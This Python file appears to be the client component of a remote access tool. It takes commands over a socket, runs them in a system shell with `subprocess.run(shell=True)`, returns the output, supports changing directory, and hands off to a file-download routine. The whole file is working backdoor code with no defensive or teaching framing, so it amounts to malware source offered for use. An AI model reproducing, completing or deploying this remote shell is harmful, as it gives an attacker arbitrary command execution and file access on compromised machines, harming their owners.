import subprocess
import os
from filedownload import *
             
def clienthandler(my_socket):
     print ("[+] Handling Client Side Connection")
     while True :
         cmd = my_socket.recv_data()
         print(f"[+] User Data : {cmd}")
         if cmd == "1" or cmd == "01":
             print("[+] Running System Commands")
             #run system command
             exe_commads(my_socket)
             continue
         
         if cmd == "02" or cmd =="2":
             download_file(my_socket)    
         elif cmd == "quit" or cmd == "exit" or cmd == "99" :
             break
         else :
             print("[+] Invalid Input")
             break
                   
         
def exe_commads(my_socket):
     print("[+] Executing Commands")
     while True:
         cmd = my_socket.recv_data()
         print(f"[+] Executing {cmd}")
         
         if cmd == "exit" or cmd == "quit" or cmd == "stop" or cmd == "99":
             print ("[+] Exiting Shell")
             break
         
         if cmd == "" :
             my_socket.send_data(runshell("pwd"))
         if cmd[:2]=='cd':
             os.chdir(cmd[3:])
             my_socket.send_data(runshell("pwd"))
             
         if cmd[:5] =="chdir":
             os.chdir(cmd[6:])
             my_socket.send_data(runshell("pwd"))
         else :
             res = runshell(cmd)
             my_socket.send_results(res)
             
def runshell(cmd):
     output = subprocess.run(cmd , shell=True, capture_output=True)
     if output.stderr.decode("utf-8")=="":
         std_out = output.stdout.decode("utf-8")
     else :
         std_out = output.stderr.decode("utf-8")
     return std_out